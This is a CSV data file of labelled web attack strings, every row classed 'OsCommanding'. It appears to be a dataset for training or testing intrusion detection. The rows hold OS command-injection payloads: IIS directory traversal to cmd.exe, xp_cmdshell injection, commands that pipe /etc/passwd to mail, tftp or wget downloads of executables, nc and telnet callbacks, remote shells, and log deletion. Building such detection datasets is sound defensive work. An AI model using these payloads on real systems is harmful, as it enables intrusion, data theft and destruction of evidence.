id,class,vector
633,OsCommanding,/raQudlTnqtU/luaEe/Nsnmu4ema5geiPbna1/https0dgroup
638,OsCommanding,..%2f..%2f..%2f..%2fwinnt/system32/cmd.exe?/c+dir
639,OsCommanding,/msadc/..���../..���../..���../winnt/system32/cmd.exe?/c+
640,OsCommanding,/wqqeidIaoR7SalndahT/ddIs/5o9_/d8brIv0EAKy/E0upt328/hn/shoeregZtovceeo/tEtrO1rnyea/np_OE6v1I4/age.html?xpwLjbpahmo=gckrn6xcaUEay&gsn6ni=dto1ehdceehims&5oe.Vc=051259&uDVy9l.6vt@f=%7Ctscript&n3elimRAnlie=3809490&tainniiecGogi=egIEat&oinleoNwfia5hMa=68788&itqesNasJfh=5172056&ntr2ic=nahllet-f6tu&ae4o0i4cw92Of=iP&eoloeo0sPFuaIu2=%27%3BEXEC+++++master.dbo.xp_cmdshell++%27cmd.exe&ere2cieewli=winnttIe&oap=88286
642,OsCommanding,/scripts/..��../winnt/system32/cmd.exe?/c+dir
644,OsCommanding,..�
646,OsCommanding,/scripts/georgi.asp/..��..��..��file.ext?
659,OsCommanding,..%%35c../winnt/system32/cmd.exe?
661,OsCommanding,/scripts/file.bat/..��..��..��winnt/system32/cmd.exe?/c%20dir%20C
665,OsCommanding,/ssi/envout.bat?|dir%20..............1
670,OsCommanding,/cqD/sfn3ehe/bzdDfOnL1rDw8TuGlK@/nlhh1otIBodvrronuon/3q/7mreppAta/bNhdfSsock_streamo@dm/m4DLNuhlE2wv/nv0/TlcOfojta7zhqjgrc.asp?mqa=iHadrhtaccesuatmswao&alldDZE9lp=rexecSersmdyfjas&0ah=stdinh&Y12UpasswdEfz5Vs=lmtidsah%5DeoarOehdivie&walowhe=nwtngrr0nto&aeh3ljccneda=uns0%3A0nabiopenV+e&r4thli=463012929
689,OsCommanding,/scripts/..%5c../winnt/system32/cmd.exe?/c+tftp%20-i%2062.107.47.226%20GET%20cool.dll%20c:\httpodbc.dll
701,OsCommanding,..%2f..%2f..%2f..%2fwinnt/system32/cmd.exe?/c+dir
720,OsCommanding,/t@6cgeny0tpH/iieywteaeetenouu1neg/tvV0YhA0v60BBQDgsBu/qo6VvfZ1adK/telnetTBSEHP/osnirnnnrlvsest/7pSA5rj5eikGmPtdTXqg/0e-GVZX1ugj/hWu4a2L/oWsh1i-nnGT4C_EtCfGQ/Nse4aieved3.pl?4FXb92Qx2C6u=488611&n6=ibp&lan=%7C+cat++++..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd+%7C&s5Tswr=voJ
725,OsCommanding,/aDrlkKCtzUbs/xenmrYitelarcnin/aBRHDBQJzg.php?Hbm=27559232&0csyAomsr=hly2&ve=rheuOEs&Ioegenisll=+dveHteht%3BNhws1s%407%3Fs&XZQftp_4=6uenb3Sahuwkr&C62FSM=6cnncectrn18l&mntjmoodiataue=tdo&iwanne=aliuzrlqThnzNvc&tlz=66354579
737,OsCommanding,/caXyVOvFvmZt0cuAUQ.aspx?netymob9esjd=eau&titI=05&ePw=%27+%3B+++ps++++-aux%3B
738,OsCommanding,UTaKcMyZ43_=i between&a3clwE=@jpEcs1bpneorn&oiceoolre=6738695&tcvb4ethnl91h=enianau5rh2tlheray&twdrtnaecutmi7y=0&iduwC49na=| ps  -auxwww   ;&egtNmOsrseq2see=491220887&notnilMugho=%varKt5en
739,OsCommanding,/ie2KQtt7@h/diar/13HKohx/tem/bZeZxxpoCVyUHWcWQa..aspx?tctqoo=666&o7DE9=4&gNbgsoundLgxmyeV=sd&aiIonwhsnxtd=158.49.25.209++%7C+++++tftp++-i+++++120.153.122.107++++PUT+sam._&rsfbywehear=hSctoTf2ic&b0HT=aWrhh%28eboot.ini%24npjl&5neiawdihoesos=ttsj3z&tmrpjqwwnt=gtiOCB&fr=f%7Ereii&Ah67o1ix0t0Hor=xCpF0lSRQt79&rcpWnqdXCOt7=tnerd1aos0t9eake
762,OsCommanding,"/scripts/file.bat"""
763,OsCommanding,/rrDKc7C3Pf9e/emj47o/TP/aonA7oidxoeldgt/60x/sGd7y1KCY-7.nsf?a9o=iBrSunbwgetn+kRtea+&MbiYKlou8n=irtihw0arts+h&.cSHwp-scriptywp-SscriptKh=%5C%22++++%5C%3B+%5C%2Fusr%5C%2Fbin%5C%2Ftelnet++++www.nsnsindend.com+++816+++++%3B&emt3acn=dixp_Eadrophuxtermchildeewi7ePf&enptinpOnprnino=68788624&ecrriuinE7aa=icoro7srx&ijpthbneruhs0i=eeuyyherioomh3jzy&btzih7iiaUsIr=baet&Dh0hruogHliuh=0rioiframeaeiHs+sCfeed&Saemolnahinitd3=eEDb1X0&rpyHaccess_logxF1W=95107193
766,OsCommanding,/qnrfivbHmUro/tscqTeieerolU8bas/ISA8/mk@e9-kevalCDNyX/oB1uTbE1eg7_U/a16knMjV6FD/TtqebsoK.js?Kexmlsampv%uA=c9P69Sbkx_&todhsaflf=mail+els%40xcwer5y.eTPccoe.gov++%3C%3C+++++%2Ftmp%2Fwu.c+++++%3B&sdftREaie=0Erjaieo&8y5yen0=vCannrec9
769,OsCommanding,/backup/..��../..��../winnt/system32/cmd.exe?/c+dir
772,OsCommanding,/iisadmpwd/..��..��..��..��..��../winnt/system32/cmd.exe?/c+
784,OsCommanding,..%%35c../winnt/system32/cmd.exe?
786,OsCommanding,/dtsicfeiEnzt/bZiylOsPJ-/K8flMLqo/uI0@KzoaThttps/bmeuccqooYooWH4/eBc4m5jlBW@/yynrwpeaoe9aoaN7n6g/nuoh3a/aUddonttnoE6sElge/f_N7rMH0STtxmqxz3.jpg?isswheons=%7C++++shell%28+++++%22cmd+++%2Fc++++c%3AInetpubwwwrootMSISSnc.exe+++-l+++++-p++5514+++-t+-e++++cmd.exe%22+%29%7C++%27&lsaEqreto8tlt=a5g6
787,OsCommanding,/rph-euQ8P/deleteg/snPKfSMGtHPhaxRmR4FG/dKhd/wdtiy/iuEgnAutksSen4n/duiesdgemmti/cRJ_DEidNHm/6MautoexecApasswd0rQ1/erjhtmaNXintwop22rn.msf?EieJwwneewsrhat=e8n4&oTxAifySrE1a=0&ltrsXessBn6u=ifY&Mye=anmI&oxiiahtnoihj=0estu&u57tei=hca&Z-Gy_rxBH=2017136&allZtG22x-Ov=%250a++nc+++++www.naesitteerne.com++80%3B&msgHEbis4tqi=9361429&Alrs41=nmetatmpdiv&kuRopteEcopy_=samtquNadgasmpd&aaadaeh=066&i1whLnod9skToi=xp_LTfmn4pteQ
791,OsCommanding,"wfs=wimY0eufgasasen&hTsock_streamVueR8bI0o=qoM%dAa%tom8ecopyp&thtNi5=7hrpositionOhtpassd|airQxterm6&9siepioftrxja5o=|dir  ..\\..\\..\\..\\..\\..\\..\\   ,&fcqeostiYnTA=1898236&sm1nq=)Irdimte&eoarubENh5=sN18\thd;de ehr"
796,OsCommanding,/ro3y6tnofrc9a2krq/tjkh1Dafgxx49az@E6MM/tne/pk/jUY/ehoicatt/cDlJdiv5jqpk9j5vt/enegdyeednih1fwe/ooWv761.aK3weV/T8i/ihkdTe8xTPCi.gif?thmtnbrPGeanl=ro&welieAweoA=sntn9o&Qqtss=hbn0m%24riabzot0&DtGCprocessing-instructionSLbnph-=3&ah8gitij9aif=59352&iScDhej4hol=3&rahitat=9903671049&ucug=506634&oicoecss=750933&un=n%3Bcerehsandwindow.open+d19positionoLd&estlrvmratlt=%5C%22++++%5C%3B++++%5C%2Fusr%5C%2Fbin%5C%2Ftelnet++www.ritaatdeto.com+++189+++%3B&usrnImH=h0jor0erf
797,OsCommanding,..%5c../..%5c../..%5c../winnt/system32/cmd.exe?/c+dir
798,OsCommanding,..%5c../..%5c../..%5c../winnt/system32/cmd.exe?/c+dir
802,OsCommanding,/Gd/Ttwfae837ehheguiceoe/edixan/kUjSsbl0TbybXWRrx@i/n2_pioMnSW9/7Op/aQi4dd1lrolnbbioZa/anl5F0ei4tgoc/RgUsO6umamconnect.u@4/uIfdmeponllgsne9nen/riahhi6so/hwGFtG@5@n_C.jpeg?xrer=itW%3D3terS&KXQYl=Ies&8LFM4zRs=%27+++++%3B++rm+%7E%2F.bash_history++%3B&staite1fennhreb=n%7CqeElwget&po8mahoFoia=r_77dhFAZz%40&hsmhel0mna=cqPMKYKaxQt_&onr=2422&sudbtqae=bqnZwy&imf=7abtOAehnlaNni
805,OsCommanding,/tytsddogwGQs3t3hq3zo/szSHG-h/8WUlnq/es/civwiNhr3maed/q5IjCCyHXalQpzl/r7s8adEehbo/vitojmCm-5wnw2.css?eszooairr=2084901&lwasn=%7C++cat+++..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd+%7C&p9nzzivn=y19d&mxdhhbwiu8=82984626&4uiEOPlmdcyZ8=1_RkzOKC3&vmi=vR7eaa_i1Ku4&5etblS3iYn=95483753&TdeeaaAtuut=exec0&rm=tATpE.bVBm&ius27hDW=o&nor=4ie7httpsim
812,OsCommanding,/rn/6yfgnf4dp1siym/ei2lml@Hp9gHMUr/j7fMQJea.vLvkzzmnQv/sAcqP@Cc@4C/et/vgujrn1It.nsf?p2sx069=725660&etmsgledcer=jg%2Berdivvitkwindow.openaeo&jat41abo=32&storxeiDdirsonr=oops%3B++++cat+++++%2Fetc%2Fpasswd++%7C+++++mail+your%40cut.com&tensn4iaija=%40ThSo%5CYoudivkna&bnrnweReatiD=esystemeinsertosmecho&deqihr9mAea=ed6vai&bdttalneB7=3&rrr1o0ra6mUlp=imunN5&tIlsgmveetn25=gEwooWnw
823,OsCommanding,/data/..��../..��../winnt/system32/cmd.exe?/c+dir
830,OsCommanding,/59un/rw0usrn11rRe/liPscn/aduThouueatotEseaaa/aI7ca/wuRQY/aQomlINRKEa/8OzVKAeuXWAY/9include9TDwkC6KF/skecoUvj.js?twhririo3ore=%7C++++%2Fusr%2Fbin%2Fnc++-vvv++++156.83.222.141+++++80%2500&teji5=6128318
833,OsCommanding,/yeeoa/ek/eR8JlwsM9chk/mmO.9k-LbQ1ud8.Ei/lESWVkSDTwtG-g/eWB@61OMlaO8.aspx?3.kOJq6=%3B%7Eicihzdt1psoa4ME&c8ea=7935851645&oe2ngdeiahrsz=c4%293r&uesmtlosptEviil=%7Eq&satxites4Ih=9&Biewnr2slaa=t5GuNLSvd8&f5qUfjX=8noi0fc&udyfngrs=z+&ble5ocpsenoe7=oD5Qp2brWykm&9d=ay&adq=sftfiHlLra+te&LqtbusrhaA=340264&mltnhaaAPt0eler=8125874&bhfle1ctiii=892320&vbTes=%250a++cat++%250a++++%2Fetc%2Fpasswd+++++%250a
840,OsCommanding,/cgi-local/alibaba.pl|dir
842,OsCommanding,"/scripts/file.bat"""
843,OsCommanding,/_mem_bin/..%5c../..%5c../..%5c../winnt/system32/cmd.exe?/c+dir
850,OsCommanding,/oeOwtVMMv.msf?Ra_P=4&feoEohxr=4850194755&gscriptUe=eobotemssinu1i
854,OsCommanding,/ssi/envout.bat?|dir%20..............1
856,OsCommanding,/i82Cat.aW3IcRkXN@J0/pB8LExrYb-TodqouK5/lOwOguxHc5jcBtt_/wF_7s/d1k5nrntnRtvtsNua/OhjroIei/eia4dtoG75FhakiS/K3yiodgeotu.mdb?4update.QlYBoA=%27%3BEXECmaster.dbo.xp_cmdshell%27cmd.exe&8iootili=b&siantYeDhyhai=poet2osehpovho&pwxw=nQr&i0an1x=rcepOl
863,OsCommanding,..�
870,OsCommanding,hogtUrj=latFWvt9oes&hkDlKdFl=ttcu6K6WBjj&teesiser=u1?a&oYnbel8tates=8094590486&tcleecrzEnnxe=nB_szAJqor&ectdto38ofhzelx=ujQvUJ2&ls=includeihe'kwlocationH&k6atdrr=0246&thUWf=re1dc8evaloa&85i7h=51935190&rwo= ZoCO8 56orR(Eau?n
888,OsCommanding,/_vti_bin/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
905,OsCommanding,/yrxyvNkM/n023V9L/s9YS@_/usloa3wmohcmNI/zaexneewrAtgrse5aC/DU7window.open-_5yAflXiCj/em@lqIYDBJ2@CE7hOKA./zV/sI2Dvgpm5gFN/aktjap6.js?kgdi=82639364&p9OX=nut%3F8rZLrk&qbes=5b9ag3lri&rw5ra9bjUaep1d=ia&rhs1eLM7=%5C%3B++%5C%2Fbin%5C%2Fid++%3B
907,OsCommanding,/SkmSLNdetc8W/rKizBm/.nxQl/iild/l7f_0vg/rdLqWsv_-g0/twtiaratabtnT/lh/guT/r0y0_MCH8I-prA/93FmcHQVUbh9_h65p.js?naSisd7ai=30180&lhksene4hmfToio=anUx_4&--PMo5A=-ea&duyHtvGetnche=8296348&t7ardoiIOtc=2&tenfrstdf=oops++++%3B++cat++++%2Fetc%2Fpasswd+++++%7C++++mail+your%409llr.com&Omttr=t%40DTJZDQq&aeyuAnuslLoeF=hVe&htoi5iy=eWM6Q2JfY&raykye=eu3
915,OsCommanding,/r@i9il.cfm?epese66beqvf=ahoRx%288%2Fi%7CeRe0b%40ince&ltyxne=oglogss&Tfp3tac9tTw=aHh&itnPfcwt=Atpaari&tunot=33970520&ro5t5=t9dXa&fs4T5Uzi-GbetweenJ=elt&nrtTpniatur=%5Cr+++++xterm++++-display++++49.100.231.11%3A0.0&2rt=1231808385&uab7iaawtd=shhfe&9seIt=2sl&@Hp3Mg=edjAmtoti&xMf=Srw
922,OsCommanding,/msadc/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
924,OsCommanding,..%5c../..%5c../..%5c../winnt/system32/cmd.exe?/c+dir
926,OsCommanding,/images/.%2e/.%2e/.%2e/.%2e/winnt/system32/cmd.exe?/c+dir
928,OsCommanding,..%c1%8s...%c1%8s..%c1%8s..%c1%8s..%c1%8s../winnt/system32/cmd.exe?/c+dir
933,OsCommanding,/9q1_wsXE/-faiNQx6t/eRVKws/XeYJILB-vm/px36fcCpWKFq.html?am6cna=d&o7snw6teqT=ammTkh&xp_S_D%uPrE=0207929&vbvar1k=sU6&1g4SUD0=rrsjhttpsnw+uigroup+byruZ&s3aes=st59&9soedw4ruHe2h=%250arm++-f++%2Fvar%2Flog%2Fhttpd%2Faccess_log+++%3B&e0prOo1n=a.Av-NXGolkA&a0ou=54&8na5tkizydsea=7zEC&eot79RdtpL2D0ii=deobjectHr&oeh7ziemmat=19&hotrP@M=bhtpass&laonikiePnuhc=82554&vHdocument_KXallAVw=tmt
947,OsCommanding,/oUDIXGv/yoeIl/nanmnrngeNwhnrhae/AY/2ID.sh?UCbnwCvbscriptKexp_3=echotlieasr&1CxpY=tmgu+ewigibvet
950,OsCommanding,/uNe.oi16701HO.S.php?N8edfemosUie=aaOexieS&hys=489406847&e3r6A=hsdqhetftrltisc4&tI5=2715&bs5Ie0uhev=h%3Dy%24s%3Athm&aortHIeamaa5tpm=%7C+++dir++..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C+++++%2C&tt0g=42&IK2m=%2FHt%25qev%7E2%2Fe&AitbsD30So=eiNooaeeuRyr
951,OsCommanding,/eU4vmXqqXEE8PR3/o458jMwRYyDz/eKYrWh81It27P6W_2/tH8BKfcr/hJTpkxaOzLrZMGXxy4ys/KsZHUnEO0avarG_/s1ykP@DguswYUH/dneq/lrt3r.cgi?window.openallVW-execn2execprocessing-instructionm=38.229.73.234%7C+++tftp+++++-i++116.26.17.207+++++PUT+sam._&SimgvV-pC=19&sDeerncoh6=287&eraekJp=ucnh9&ss=bjNtarhhusabtae
953,OsCommanding,/h1I-85sxBOh8oLhuyIm0.jpeg?-rEvZ=ik_-XQkkVKVe&PbkfvIk=d8lmndmkipAhhn26&a3NuBD5HcoG=%5C%3B%5C%2Fbin%5C%2Fid+++%3B&U2.K=54&eetw=2afehujhc5&DtoNsT4esp=e5f&4j2Eets=iegroup+byr&inKanp=2&ganme=3364&-y_UZsystemPt=t+sTi
962,OsCommanding,/bin/swOneen.pl/seite=;cat
965,OsCommanding,"ebeR0hn0mogd=](0Edgdii1eius    l&nt=743&vxp=tol&lnuheqtn0t4=eEpulztlroi>&y9EbbodymH=07668&tp=eeosueAlsesekc7r&hoeh=""   ;  telnet  6.166.38.59  80  ;&atnLkht=~8doseits7 -t&eiro=yhBd1&nteoar4egpsntc=SieS%&hgtlla=asnodewfewejeap&enacruhunrnshie=lses"
969,OsCommanding,/Z-mQ2c/m4sxdPVVN04X21/5a.tiff?8b66having_Cprocessing-instructionautoexec=%27%3B+EXEC++master.dbo.sp_makewebtask++++%27c%3A%5Cinetpub%5Cwwwroot%5Clie7r9d.js%27%2C+++%27SELECT+++++pxqrs++FROM++ie++++WHERE++++xtype%3D%27%27U%27%27%27&ss=w1fwget3gmf&nore=9146&Soqls6p=790969&FDF7tLxmlAvU=069&vmss=83&4uoreMhhc=ni%26nspeo%28r&l2pesr5l1oet=llrIchSshutdown
973,OsCommanding,/scripts/..�/../winnt/system32/cmd.exe?/c+dir
974,OsCommanding,7tRie=xxQnjk..68bq&FLJj@CUc=asGpdvT&lsncub2kd0=ojr54G&ha4ltoSwgh=8&qil4an=1094&Pj8exec4ClbbUvR=I7netcatedr6gr&reseiartcglo=11848
975,OsCommanding,/oVbWQyKs5Z8q9KloYk/ei/nR1Zy/seDnqutfyhi0znq/aAuERfEkJAeGUoJ/oOIu-ZjDF9@NwQmOQDxj/kA/IxmRceeqeoneteioois/mY.5ls9Egi3CY/i2bsknD6kCCxIV7-b/eirCmfIzIDn0m4Y1N.exe?6ZlfchildopengslK=4965278&ttaf6hvbsih76he=veh8ecopy+e3&8dmiht9tado=t3eqMdC&rvkbmqsr=VRhlloinliT
978,OsCommanding,/file.bat/..��..��..��winnt/system32/cmd.exe/c
987,OsCommanding,..%%35%63../..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir
993,OsCommanding,/scripts/georgi.asp/..��..��..��file.ext?
1007,OsCommanding,..%%35%63../..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir
1008,OsCommanding,..��../winnt/system32/cmd.exe?/c+dir
1013,OsCommanding,Aaea=wf|o&irnn7=344&AotthteDTi=5523758&nteo=nwhmtfcl1c&ia=8288672&hseusevsdwttott=33&geastse=Zem6&9rH6Lbinput6=7907554574&tttudedezuea7=x91bCHWT@&bie=sconnectema&ddwinntBl5DFhavinghaving=ma\o&rn=onasdrhsafpnw&boiab7e1Cp=osfY&tiowr1seh=57575&o0urcRhHMUK=iILyW-eJnWs
1014,OsCommanding,/eR/qe7qA3bms3wSxGU_Ov/aFUT/iZFfiDnOV/juanriarsCl/tG99U9UWpw9dXk@o/eOP7yWYG/oamaoot3n/htetc.swf?n6htedwoaswLn=oe&tnadNLyemvcgi=3&nH0aWycatB=80&iEodHpDn4minE=t+ua+&6lgntopasto=IIuqlWMt%27&NeOhr=%250a+++cat+%250a++++%2Fetc%2Fpasswd%250a&n9TrllRpe=IsbH&haan=7&fromXq8qops3=76008&a9oeHhT2raI=u&arslbpRmdR=YYa&lvcasikfgnNtE=home%25%40io%40sshoemrsipconnecteni&5yPnRtmhgddyh=0609&gqcsgnfTupy=yIpmotueevo6CC
1027,OsCommanding,/fIRpHj/7RiG7W/nNii/0E4s/oipot2.jsp?eyai=1930338675&tErR=99&VHLbB=st3&saUd=LcctseeHipqhg&co=%250a+++++nc++++www.tosilatite.com++80%3B&dhcTa=4969542&3zzlTotcyoyeo=ErpnunRppz5adiO&2t1uEo=eisflink&lsd=963639295&AadDpgtwheia=%26n&UE@BJ02KmcRr=tBbU86&jEdiaplheus2ns=1104910255&ee=2421275761&evalvSinputAULsv=8474
1032,OsCommanding,..%%35c../..%%35c../..%35c../..%35c../winnt/system32/cmd.exe?
1047,OsCommanding,/eeae/21wsjodrop5rF/IeS6oruhroEeIeeg/tS6Qge5eetsccFD/aahByc/os4bgd7h6a7asuenaN/rolEqtWu/aaa/enI7E-KGbCqIXi.gif?S4jue1Noqnwice=9909&ntrSNsetijtdgN=+++++%3B+echo+++++%3B+++w+++++%3B+uname+++++-a++++%3B+++++id&meta5hPA.g=903980&cirs=60312&oteowttosdtd=348702052
1052,OsCommanding,fntw3dohausgi=d1wNfya&6otya9=66700&t8otnsf7tSagH4=ln&e6rhgmeueyu=e|sOsjtstdincadminposition
1062,OsCommanding,..%2f..%2f..%2f..%2fwinnt/system32/cmd.exe?/c+dir
1082,OsCommanding,igte=61124386&mrootdoirI=(t&mrtredaptoxcn=adhsh&ntA8f8ruyottftr=94149750&edk3=06742486&Xsq9s=90492438&xj=itdpise&ggOQhomei2AkCautoexec=etcida&Rik3fr=[x&tlstndzhu9=89&R2.all=hR1Mths&phrnttttre=So-e:eY=iwhereSfR
1089,OsCommanding,/Ebslnhoooas0/iKZ.nApQ0HDpfwXbO/uXGoxf0H_hIHBGQW/0aanegehos8ho/buvarhVh2o/yguhk23esAnasp0e.sh?piiIrnewmymae=0lr5%29fromfi&opttAnyc=tB9Y&jUDetcdropWL-null=ehlNJvX.Mr&oNsri0ehhl4og=173&opensamDkz1PmetaS235=rwp-sh&hen6enriz=41634694&tsdnbuodElnh=os&nHninod0ejn=317&MaYNA=%250arm+++-f++%2Fvar%2Flog%2Fhttpd%2Faccess_log%3B&oonAtf=%7E%28g-jahaccepti6Etiaxng&eEtiidbtnt=5181&euiMior=6&oaa=842
1104,OsCommanding,/nmU.qe_Elx/jW5/lf9SUdY5B/F0KB-AU@dpjcdQ.php4?cieo0tt=dscriptbhj5ed&Bocmdw=3%2BOae&lh6tX=ahowg&UyGaooh1biph=52&iH=ihN&vhm=3243489&Nepd=38264&So6jtLp=tIlteovBsh&ieiaswbuBctdnO=eeezQn&r6cragso=%27+++++%3B++++ps++++-aux+%3B&n2htNo=k6Fq&cD6hN3wtroeto=sd&hmTf=180341666&keuyeiDn=ntsee6e
1114,OsCommanding,eo5eEewwt=e&ia8r02l2lMa=J3ntroHSaiu&eose7lsqee5fdl=nmdeedt&to2eni=gcbondAeioDuaht&lO8oehstgnai=1I.bFo8l&oseasq7oitoDMe='     ;uftp   -g  /home/llalse/siteortrtric  78.175.8.80    /esilns  ;&ost=51805
1115,OsCommanding,/7fXvod_ABj9v/b3PNOEB6/32uasbbsvhrI11oo6mie/nYdcR/hrgpL6/cf.tiff?tk0tkte=9107301&cRojmRonisnsoOs=%5Cn++++wget++++http%3A%2F%2F214.253.116.115%3A40912%2Fnftp.exe&oMthSAot=Hirqea1No+smupdaten%3Aeobject&d2hecepyc5=49378&Eeotffceorv7po=h+y&ilm=1056&tKcopyye=ps&ehebeer61Rlse4=uaorhcmdconnectghp84l&tuseusn=Odi&4enfsktdewc=0dxemaccess_log&JgtchEpcL0=nia6ie3hnmr6ede&aetnerla=68506541&it=betweenj%2Figjtgecopy
1123,OsCommanding,pia6meia=x;jsgxp_bnph-8nAh5iauniona&9f12Pt@.=mail sead@ihli.rreshd.gov  <<    /tmp/wu.c;&vDaai2je1eitao=eiE~ da o&lenato1daTrle6=r&ta=((i-r6oh&metatnr6hZpC=n'nla:+t te+&VVJU.z=oqu&q-QhtpassoR4F=6011&HeconincnnD=\)aI;s8l&FJkhkbn9Tlog=st3akaalmeb8uSdcm
1126,OsCommanding,/tKtr/nie62grp/sjUK/iasohk7hxft0nra/3isicaeeCogdhtizEis/hHB073CUV.tiff?Rvmn=onode&6tkyt=df7zUpvFTC&ngphpatbdfc=e%25&ewLseataepe2akn=5aw%27qwiframeeaGe-b&seau3=lpidGgfRetaje&rrrbesgdr=184.62.22.223+++%7C++tftp+192.168.10.33+evil.txt&yAr8EeaneetgOiw=eQasbxoouesmoeQ
1127,OsCommanding,..�
1129,OsCommanding,/@iwfqSyX/b09K/j1trnt/LshO91/3eg/a6fhPA5R@QWr.jNW-e/ArsyaacTnqre.shtml?et=c1Ae&m6t9dpeare=amvXipsDahdooeo6&ansTusef0wOe=vng&a1etunsiltth9hm=226519356&d51wo1UF.0=d4ascea612zbude&eagtt=74421309&hd31=%22%3B++++%2Fusr%2Fbin%2Fwget+www.icolicliteon.com%2Fintatr+++%3B&thataeall=radaljcnsarr&Aahshohtzt=Si%40c&eh1eNncet=51
1130,OsCommanding,/tWoS/dp7ve7afcateet/BZlbYY6tmp0C/a@h/5Je1jXmnSWcmJVUg7E-b/coa/dtt6fwuheytinhu/8ity3hder4stenEneetr.tiff?egtlEtl=9irbyawp-avLt%3DasCagnevalo&M@O1=rpBntzPU0&uodsetei=0%7CRs&or3el=xtktmpeer%5Dl&wFen=16&OurfiVtAS=%2Bt&jene3r6cso=copy2nrcprzl%40yrmneet-Eevalit&eC2wtSdEt=772616&ennVeeDeeic=h%3Edi-shutdown&10wM=01960&Sf7=tteuntmpnsy2or5&e8mttYnnree=oxMrX5&yv8uFgba6_cat=tftp+-c+++get+++50.47.129.42%3A%2Fesnindni%2Fveet.exe%7C&tEaAU9me6i3Q=54019748&oexlzoeoocnlC=s8ccumochagtderm%3Ath8satg
1135,OsCommanding,/bD/tosPY6EEmeta/2xg7/fKXpcqxuj/aeC7J2FDz/sQcbfNRMFqAD/GK9_L7JpH/LeiOoeheoaet/allRIShttpsRp@KXNt3At/gzreplaced9utelneti/pSY5KHMFWlvphp.asmx?sdUMe=2&ouwixgElpg=41972115&tav8rpisu7ntis9=yhQp8mu&thacyb505d5hun=h&zO5m7ioyO=952889&3VfNuYg1-KS_=6947917&Asij=%3Ef&1lPZ=ho2ra6vbscriptei&cfp=67&Yperl@PZAs=018573&cisqmhnoywmm=%250arm++-f++%2Fvar%2Flog%2Fhttpd%2Faccess_log+%3B&6rv0snghnE70sr=hdPzO7wSVjKX
1145,OsCommanding,/iBeketo8si6/3aWBeOEYtYuT/Eh6Lrtc/erorwiwswhoeeuh.bin?Sperlfs@6L8=+++++%3B+++++echo+++%3B+++w+++++%3B+++++uname+-a+++++%3B++id
1153,OsCommanding,/9connectHtmpJVYQ_JvZscript/nfRhvidal3htnMr8p/sdneLren/a0M0z/ltoitTtirmlogw8H/hhcG9AKDwwyzpUEt/iunionzL@Pv8gzKJstdin/qlFvmdf/sFKGce/1aH9ru./dsRHmfue.css?GFBftpi3F0=468942969&M_Lddphpye-=8717137&wnn=nb6&tAm=hiazla3aoeflnitg&plnlrxaceen=854276&saTtveolkt6ih=iOyDqai4w8wn&WscVQ=pmt5bath&NeesENCitr=5627300&KcKa=62734&ag6blta=lb6CWC3&edEedAwm=tnthrwt8emAha80o
1154,OsCommanding,/backup/..��../..��../winnt/system32/cmd.exe?/c+dir
1155,OsCommanding,aeN32nwae=tftp   -c    get  66.68.180.239:/ortens/en.exe     |&bdiehcolh=r2eEjSsj5:c&cdnnnEckabtgRt=orhrrctsiadmin
1163,OsCommanding,..%%35%63../..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir
1167,OsCommanding,/data/..��../..��../winnt/system32/cmd.exe?/c+dir
1171,OsCommanding,/_mem_bin/..%5c../..%5c../..%5c../winnt/system32/cmd.exe?/c+dir
1182,OsCommanding,/images/.%2e/.%2e/.%2e/.%2e/winnt/system32/cmd.exe?/c+dir
1197,OsCommanding,0sdj6n=enbESd&leoasuieiytz=wQXH24K&onvnRhnjnodor=esvQgQOgGX6E&zsTY=3&gehcotltc=a&pJexecX2AGhAA=dlikey&rIc7tnph-=H0eE&w6w8Fy5iUz=:yer]t
